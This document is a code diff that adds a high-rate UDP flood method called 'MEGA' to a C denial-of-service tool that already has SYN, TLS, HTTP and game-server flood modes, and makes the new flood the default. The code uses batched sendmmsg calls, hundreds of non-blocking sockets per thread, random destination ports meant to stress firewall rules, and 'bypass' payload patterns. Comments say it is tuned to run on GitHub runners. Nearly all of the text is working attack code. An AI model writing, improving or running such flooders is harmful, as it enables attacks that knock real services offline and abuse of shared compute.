@@ -1336,6 +1336,150 @@ static void *game_worker(void *arg) {
 }
 
 /* ════════════════════════════════════════════════════════════════════════
+ *  METHOD 6 — MEGA  (UDP PPS — ported from base FJIUM-PPS)
+ *
+ *  This is what made the original base strong:
+ *    • sendmmsg batch (kernel multi-send)
+ *    • iov_len=0 → zero-byte UDP (max PPS, minimal copy)
+ *    • hundreds of UDP sockets + SO_REUSEPORT
+ *    • SO_SNDBUF large, NONBLOCK, no usleep in hot loop
+ *    • CPU affinity per worker
+ *
+ *  Caps tuned for GitHub runners (FD/ulimit) while keeping base spirit.
+ *  Bandwidth note: zero-byte still costs ~28B IP+UDP header per pkt.
+ * ════════════════════════════════════════════════════════════════════════ */
+#define MEGA_BATCH   1024   /* UIO_MAXIOV ceiling on most kernels */
+#define MEGA_BURST   48
+#define MEGA_SOCKS   256    /* per worker; total ≈ workers * 256 */
+
+static void *mega_pps_worker(void *arg) {
+    AttackThread *mt = (AttackThread *)arg;
+    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
+    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
+    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
+
+    size_t m_sz = sizeof(struct mmsghdr) * MEGA_BATCH;
+    size_t v_sz = sizeof(struct iovec) * MEGA_BATCH;
+    size_t d_sz = sizeof(struct sockaddr_in) * MEGA_BATCH;
+    struct mmsghdr *msgs = mmap(NULL, m_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    struct iovec *iovs = mmap(NULL, v_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    struct sockaddr_in *dests = mmap(NULL, d_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (msgs == MAP_FAILED || iovs == MAP_FAILED || dests == MAP_FAILED) {
+        if (msgs != MAP_FAILED) munmap(msgs, m_sz);
+        if (iovs != MAP_FAILED) munmap(iovs, v_sz);
+        if (dests != MAP_FAILED) munmap(dests, d_sz);
+        return NULL;
+    }
+
+    /* Optional small bypass blob for 10% of packets (rest zero-byte for max PPS) */
+    unsigned char bypass_blob[64];
+    int bypass_len = 0;
+    if (num_bypass_patterns > 0) {
+        int idx = select_optimal_bypass_pattern(mt->worker_id, 0);
+        if (idx >= 0 && idx < num_bypass_patterns) {
+            bypass_len = enhanced_bypass_patterns[idx].length;
+            if (bypass_len > 64) bypass_len = 64;
+            memcpy(bypass_blob, enhanced_bypass_patterns[idx].payload, (size_t)bypass_len);
+        }
+    }
+
+    for (int i = 0; i < MEGA_BATCH; i++) {
+        dests[i] = mt->target;
+        dests[i].sin_family = AF_INET;
+        dests[i].sin_port = htons((uint16_t)(mt->port_base > 0 ? mt->port_base : 80));
+        iovs[i].iov_base = &dests[i]; /* dummy for zero-byte */
+        iovs[i].iov_len  = 0;         /* ZERO-BYTE = max PPS (base fjium-pps) */
+        msgs[i].msg_hdr.msg_iov = &iovs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+        msgs[i].msg_hdr.msg_name = &dests[i];
+        msgs[i].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
+        msgs[i].msg_hdr.msg_control = NULL;
+        msgs[i].msg_hdr.msg_controllen = 0;
+        msgs[i].msg_hdr.msg_flags = 0;
+        msgs[i].msg_len = 0;
+    }
+
+    int socks[MEGA_SOCKS];
+    int nsocks = 0;
+    for (int i = 0; i < MEGA_SOCKS; i++) {
+        int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if (s < 0) break;
+        int one = 1;
+        setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+        setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one));
+#ifdef SO_NO_CHECK
+        setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &one, sizeof(one));
+#endif
+        int buf = 16 * 1024 * 1024; /* 16MB — base used 16–128MB */
+        setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
+#ifdef SO_SNDBUFFORCE
+        setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
+#endif
+        fcntl(s, F_SETFL, O_NONBLOCK);
+        socks[nsocks++] = s;
+    }
+    if (nsocks == 0) {
+        munmap(msgs, m_sz); munmap(iovs, v_sz); munmap(dests, d_sz);
+        return NULL;
+    }
+
+    if (mt->worker_id == 0)
+        fprintf(stderr, "[atk] MEGA PPS → %s:%d socks/worker=%d batch=%d (base-style UDP)\n",
+                mt->host, mt->port_base, nsocks, MEGA_BATCH);
+
+    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
+    time_t start = time(NULL);
+    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
+#ifdef MSG_ZEROCOPY
+    /* optional — ignore if fails */
+#endif
+    int loop = 0;
+
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        /* light throttle only — base had almost none in hot path */
+        if ((loop++ & 0x3FF) == 0) {
+            int us = should_throttle();
+            if (us > 0) usleep((unsigned)(us > 2000 ? 2000 : us));
+        }
+
+        /* rotate dest port lightly (25% random) to stress multi-port FW rules */
+        for (int i = 0; i < MEGA_BATCH; i++) {
+            uint16_t p = (rs(&seed) & 3)
+                ? (uint16_t)(1 + (rs(&seed) % 65535))
+                : (uint16_t)(mt->port_base > 0 ? mt->port_base : 80);
+            dests[i].sin_port = htons(p ? p : 1);
+            /* 90% zero-byte, 10% bypass pattern (base mix) */
+            if (bypass_len > 0 && (rs(&seed) % 10) == 0) {
+                iovs[i].iov_base = bypass_blob;
+                iovs[i].iov_len  = (size_t)bypass_len;
+            } else {
+                iovs[i].iov_base = &dests[i];
+                iovs[i].iov_len  = 0;
+            }
+        }
+
+        for (int si = 0; si < nsocks && !is_attack_stop(); si++) {
+            for (int b = 0; b < MEGA_BURST && !is_attack_stop(); b++) {
+                int r = sendmmsg(socks[si], msgs, MEGA_BATCH, flags);
+                if (r > 0) {
+                    /* approx: each zero-byte pkt ≈ 28B wire (IP+UDP hdr) */
+                    pkt_sent(r * 28);
+                } else if (r < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                    break;
+                } else {
+                    break; /* backpressure */
+                }
+            }
+        }
+        /* NO usleep in hot path — base did not sleep every loop */
+    }
+
+    for (int i = 0; i < nsocks; i++) close(socks[i]);
+    munmap(msgs, m_sz); munmap(iovs, v_sz); munmap(dests, d_sz);
+    return NULL;
+}
+
+/* ════════════════════════════════════════════════════════════════════════
  *  Dispatcher + entry point
  * ════════════════════════════════════════════════════════════════════════ */
 static void *dispatch_worker(void *arg) {
@@ -1346,7 +1490,8 @@ static void *dispatch_worker(void *arg) {
     case 3: return tls_worker(arg);
     case 4: return http_worker(arg);
     case 5: return game_worker(arg);
-    default: return pspe_worker(arg);
+    case 6: return mega_pps_worker(arg);
+    default: return mega_pps_worker(arg);
     }
 }
 
@@ -1378,10 +1523,13 @@ void *bg_attack_thread(void *arg) {
             nm[j++] = (char)((*p >= 'a' && *p <= 'z') ? *p - 32 : *p);
     }
 
-    /* Methods: PSPE | TCP | TLS | HTTP | GAME */
+    /* Methods: MEGA (UDP PPS base) | PSPE | TCP | TLS | HTTP | GAME */
     int tag = 0;
-    const char *label = "PSPE";
-    if (atk->mega_mode || !strcmp(nm, "PSPE") || !strcmp(nm, "MEGA") || !strcmp(nm, "UDP") || !strcmp(nm, "PORT") || !strcmp(nm, "SCAN")) {
+    const char *label = "MEGA";
+    if (atk->mega_mode || !strcmp(nm, "MEGA") || !strcmp(nm, "UDP") || !strcmp(nm, "PPS")
+        || !strcmp(nm, "FJIUM-PPS") || !strcmp(nm, "HEX") || !strcmp(nm, "GUDP")) {
+        tag = 6; label = "MEGA";
+    } else if (!strcmp(nm, "PSPE") || !strcmp(nm, "PORT") || !strcmp(nm, "SCAN")) {
         tag = 1; label = "PSPE";
     } else if (!strcmp(nm, "TCP") || !strcmp(nm, "SYN") || !strcmp(nm, "SYNFLOOD")) {
         tag = 2; label = "TCP";
@@ -1392,7 +1540,7 @@ void *bg_attack_thread(void *arg) {
     } else if (!strcmp(nm, "GAME") || !strcmp(nm, "NRO")) {
         tag = 5; label = "GAME";
     } else {
-        fprintf(stderr, "[atk] unknown method '%s' (use PSPE|TCP|TLS|HTTP|GAME)\n", nm);
+        fprintf(stderr, "[atk] unknown method '%s' (use MEGA|PSPE|TCP|TLS|HTTP|GAME)\n", nm);
         set_attack_active(0);
         free(ctx);
         return NULL;
